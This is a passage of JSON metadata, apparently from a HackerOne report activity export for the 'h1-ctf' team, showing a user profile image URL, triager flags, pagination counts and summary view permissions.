                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}